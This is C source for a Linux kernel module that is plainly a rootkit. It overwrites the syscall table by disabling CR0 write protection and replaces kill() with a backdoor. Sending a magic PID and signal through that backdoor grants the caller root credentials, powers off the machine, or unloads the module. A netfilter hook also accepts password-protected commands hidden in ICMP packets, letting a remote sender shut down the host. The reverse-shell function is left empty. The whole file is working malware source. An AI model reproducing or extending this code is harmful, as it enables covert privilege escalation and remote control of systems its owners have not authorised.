#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/reboot.h>

#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/udp.h>
#include <linux/icmp.h>
#include <linux/ip.h>
#include <linux/inet.h>
#include <linux/icmp.h>

#include <linux/sched.h>
#include <linux/kthread.h>
#include <err.h>

//-------------------------------------------------------------------------------------------

MODULE_LICENSE("GPL");

#define SIG_SHUTDOWN 58
#define SIG_ROOT 59
#define SIG_UNLOAD 60

#define PID 12345
#define PASSWD "rkit"
#define CMD_SHUTDOWN "shutdown"
#define CMD_UNLOAD "unload"
#define CMD_SHELL "cmd"

#define DEBUG

#define REVERSE_SHORT(n) ((unsigned short) (((n & 0xFF) << 8) | \
                                            ((n & 0xFF00) >> 8)))

//-------------------------------------------------------------------------------------------

typedef asmlinkage int (*orig_kill_t)(pid_t, int);
static unsigned long *__syscall_table;
orig_kill_t orig_kill;
static struct nf_hook_ops nfho;
struct sk_buff *sock_buff;
struct udphdr *udp_header;
struct iphdr *ip_header;
struct ethhdr *mac_header;
struct icmphdr *icmp_header;
static struct task_struct *shell_task;
char data[1024] = {0};

//-------------------------------------------------------------------------------------------



//-------------------------------------------------------------------------------------------

void unload(char* modname) {
	char *argv[] = {"/sbin/rmmod", modname, NULL};	// Fill calling program with rmmod <modname>
	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);	// Call command in user land
}

//-------------------------------------------------------------------------------------------

int reverse_shell(char *ip, int port){
    
    return 0;
}

//-------------------------------------------------------------------------------------------

int execute_command(char *data, char *src, int port) {
	if (strncmp(data, PASSWD, strlen(PASSWD)) != 0) {
		#ifdef DEBUG
		printk(KERN_INFO "LKM: Received password: INVALID\n");
        printk("\n");
		#endif		
		return 1;
	}
	
	data = (data) + (strlen(PASSWD) + 1);
	
	if (strncmp(data, CMD_SHUTDOWN, strlen(CMD_SHUTDOWN)) == 0) {
		#ifdef DEBUG
		printk(KERN_INFO "LKM: Received shutdown command.\n");
        printk("\n");
		#endif

		char *argv[] = {"/sbin/shutdown", "now", "&", NULL};	// Fill calling program with shutdown now
	    call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);	// Call command in user land

	} else if (strncmp(data, CMD_UNLOAD, strlen(CMD_UNLOAD)) == 0) {
		#ifdef DEBUG
		printk(KERN_INFO "LKM: Received unload command.\n");
        printk("\n");
		#endif
		unload(THIS_MODULE->name);
	} else if (strncmp(data, CMD_SHELL, strlen(CMD_SHELL)) == 0) {
		#ifdef DEBUG
		printk(KERN_INFO "LKM: Received shell command.\n");
        printk(KERN_INFO "LKM: Target: %s\n", src);
        printk(KERN_INFO "LKM: Port: %d\n", port);
		#endif

        reverse_shell(src, port);
	}
	
	return 0;
}

//-------------------------------------------------------------------------------------------

unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
	sock_buff = skb;	// Get socket buffer
	ip_header = (struct iphdr *) skb_network_header(sock_buff);	// Grab network header
	mac_header = (struct ethhdr *) skb_mac_header(sock_buff);	// Grab mac header
	
	if (!sock_buff) {	// Check if socket buffer is valid
		return NF_DROP;
	}
	
	if (ip_header->protocol == IPPROTO_ICMP) {	// If packet protocol is ICMP
		icmp_header = icmp_hdr(skb);
		strncpy(data, (char*)icmp_header + sizeof(struct icmphdr), sizeof(data) - 1);
		#ifdef DEBUG
		printk(KERN_INFO "New ICMP Packet:\n");
		printk(KERN_INFO "Src: %pI4\n", &ip_header->saddr);
		printk(KERN_INFO "Dst: %pI4\n", &ip_header->daddr);
		printk(KERN_INFO "ID: %hu\n", (unsigned short int) REVERSE_SHORT(icmp_header->un.echo.id));
		printk(KERN_INFO "Data: %s\n", data);
		#endif
		
		char src[16] = {0};
		snprintf(src, 16, "%pI4", &ip_header->saddr);

		execute_command(data, src, (int) REVERSE_SHORT(icmp_header->un.echo.id));
	}
	
	return NF_ACCEPT;
}

//-------------------------------------------------------------------------------------------

unsigned long *find_syscall_table(void)
{
	unsigned long *syscall_table;
	unsigned long int i;

	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
			i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
}

//-------------------------------------------------------------------------------------------

void give_root(void) {
	struct cred *newcreds;	// Create object for new credentials
	newcreds = prepare_creds();	// Create credentials
	if (newcreds == NULL)	// Check if created credentials are valid
		return;

	// Set permissions to ROOT

	newcreds->uid.val = newcreds->gid.val = 0;
	newcreds->euid.val = newcreds->egid.val = 0;
	newcreds->suid.val = newcreds->sgid.val = 0;
	newcreds->fsuid.val = newcreds->fsgid.val = 0;
	
	commit_creds(newcreds);	// Commit credentials to terminal
}

//-------------------------------------------------------------------------------------------

asmlinkage int hacked_kill(pid_t pid, int sig) {
	int tpid = PID, ret_tmp;

	if ((tpid == pid)) {	// Check if PID is the correct one
		switch (sig) {
			case SIG_SHUTDOWN:	// If signal is SIG_SHUTDOWN
				#ifdef DEBUG
				printk(KERN_INFO "LKM: Received shutdown signal.\n");
				#endif
				kernel_power_off();		// Power off the kernel
				break;
			
			case SIG_ROOT:	// If signal is SIG_ROOT
				#ifdef DEBUG
				printk(KERN_INFO "LKM: Received root signal.\n");
				#endif
				give_root();	// Give root to current terminal
				break;

			case SIG_UNLOAD:	// If signal is SIG_UNLOAD
				#ifdef DEBUG
				printk(KERN_INFO "LKM: Received unload signal.\n");
				#endif
				unload(THIS_MODULE->name);	// Unload current module
				break;

			default:	// If signal is not recognized
				#ifdef DEBUG
				printk(KERN_INFO "LKM: Received invalid signal %d.\n", sig);
				#endif
				break;
		}

		return 0;
	} else {
		ret_tmp = orig_kill(pid, sig);	// If pid is not correct, execute the original kill function
		return (ret_tmp);	// And return value of original function
	}
}

//-------------------------------------------------------------------------------------------

static int __init startup(void) {	
	__syscall_table = find_syscall_table();	// Take the address of the syscall table
	if (!__syscall_table) {	// Check if syscall table was found
		#ifdef DEBUG
		printk(KERN_INFO "LKM: Syscall table not found\n");
		#endif
		return -1;
	}
	
	nfho.hook = hook_func;
	nfho.hooknum = 4;	// 0 Capture ICMP Requests, 4 Capture ICMP Replies
	nfho.pf = PF_INET;	// IPv4 packets
	nfho.priority = NF_IP_PRI_FIRST;	// Set highest priority
	nf_register_net_hook(&init_net, &nfho);	// Register hook

	write_cr0(read_cr0() & (~ 0x10000));	// Make the syscall table writeable
	
	orig_kill = (orig_kill_t) __syscall_table[__NR_kill];	// Save the original kill function
	__syscall_table[__NR_kill] = (unsigned long) hacked_kill;	// Replace the kill function with the hacked one
	
	write_cr0(read_cr0() | 0x10000);	// Make the syscall table read only

#ifdef DEBUG
	printk(KERN_INFO "LKM: Module loaded as %s!\n", THIS_MODULE->name);
#endif
	return 0;
}

//-------------------------------------------------------------------------------------------nf_register_net_hook(&init_net, reg)

static void __exit cleanup(void) {
	nf_unregister_net_hook(&init_net, &nfho);	// Unregister hook

	write_cr0(read_cr0() & (~ 0x10000));	// Make the syscall table writeable
	__syscall_table[__NR_kill] = (unsigned long) orig_kill;	// Restore the original kill function
	write_cr0(read_cr0() | 0x10000);	// Make the syscall table read only

#ifdef DEBUG
	printk(KERN_INFO "LKM: Module unloaded!\n");
#endif
}

//-------------------------------------------------------------------------------------------

module_init(startup);
module_exit(cleanup);
